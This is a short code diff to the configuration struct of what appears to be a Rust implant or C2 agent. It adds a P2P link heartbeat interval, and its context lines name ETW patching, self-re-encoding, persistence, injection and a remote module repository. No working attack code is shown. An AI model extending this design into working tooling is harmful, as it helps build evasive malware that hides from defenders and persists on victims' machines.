@@ -714,6 +714,12 @@ pub struct Config {
     /// hardware-breakpoint VEH approach instead.
     #[serde(default)]
     pub etw_patch_method: Option<EtwPatchMethod>,
+    /// P2P link heartbeat interval in seconds.  Each side of a P2P link sends
+    /// a `LinkHeartbeat` frame at this interval.  If no heartbeat or data frame
+    /// is received within `3 * p2p_heartbeat_interval_secs`, the link is
+    /// considered dead.  Default: 30 s.
+    #[serde(default = "default_p2p_heartbeat")]
+    pub p2p_heartbeat_interval_secs: u64,
     /// Interval in seconds between periodic self-re-encoding passes.  Only
     /// effective when the agent is compiled with the `self-reencode` feature.
     /// Default: 14 400 s (4 hours).
@@ -853,6 +859,10 @@ fn default_module_repo() -> String {
     "https://updates.example.com/modules".into()
 }
 
+fn default_p2p_heartbeat() -> u64 {
+    30
+}
+
 fn default_reencode_interval() -> u64 {
     14_400 // 4 hours
 }
@@ -923,6 +933,7 @@ impl Default for Config {
             exec_strategy: ExecStrategy::Indirect,
             persistence: PersistenceConfig::default(),
             etw_patch_method: None,
+            p2p_heartbeat_interval_secs: default_p2p_heartbeat(),
             reencode_interval_secs: default_reencode_interval(),
             injection: InjectionConfig::default(),
         }
